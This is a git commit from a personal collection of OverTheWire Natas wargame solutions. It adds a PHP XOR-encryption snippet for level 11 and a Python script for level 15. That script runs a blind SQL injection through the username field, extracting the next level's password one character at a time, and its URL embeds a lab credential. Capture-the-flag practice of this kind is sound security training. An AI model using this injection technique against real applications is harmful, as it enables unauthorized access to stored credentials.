0141022bb58a045b50ceeb6f68ddc658c19d63bd
Eric Zhu <ericxjzhu@gmail.com>
2023-10-30 22:07:24 +1100

    Add natas15

---
+++ natas11/natas11.php
@@ -0,0 +1,16 @@
+<?php
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
---
+++ natas15/natas15.py
@@ -0,0 +1,16 @@
+import requests
+from string import ascii_letters, digits
+
+URL = f'http://natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB@natas15.natas.labs.overthewire.org'
+
+characters = ascii_letters + digits
+
+password = ''
+while len(password) < 32:
+    for char in characters:
+        payload = {'username': f'natas16" and password LIKE BINARY "{password + char}%"#'}
+        r = requests.post(URL, data=payload)
+        if 'This user exists.' in r.text:
+            password += char
+            print(password)
+            pass
